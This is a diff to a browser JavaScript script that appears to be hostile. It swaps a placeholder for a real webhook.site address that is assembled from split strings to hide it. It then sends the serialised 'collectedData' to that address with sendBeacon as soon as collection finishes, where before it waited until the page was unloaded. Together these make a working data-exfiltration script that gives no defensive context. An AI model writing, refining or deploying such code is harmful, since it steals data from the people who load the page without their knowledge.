@@ -49,16 +49,14 @@
         };
     }
 
-    function obfuscatedWebhook() {
-        const p1 = 'https://webhook';
-        const p2 = 'site/';
-        const p3 = 'your-actual-uuid-here';
-        const p4 = '-endpoint';
-        return p1 + '.' + p2 + p3 + p4;
+    function getWebhookUrl() {
+        const a = 'https://webhook';
+        const b = 'site/292a243c-cfd6-4e33-9a14-ee5b863b95a2';
+        return a + '.' + b;
     }
 
     function sendData() {
-        const url = obfuscatedWebhook();
+        const url = getWebhookUrl();
         const payload = JSON.stringify(collectedData);
         
         if (navigator.sendBeacon) {
@@ -74,8 +72,5 @@
     }
 
     collectAll();
-
-    window.addEventListener('beforeunload', function() {
-        sendData();
-    });
+    sendData();
 })();
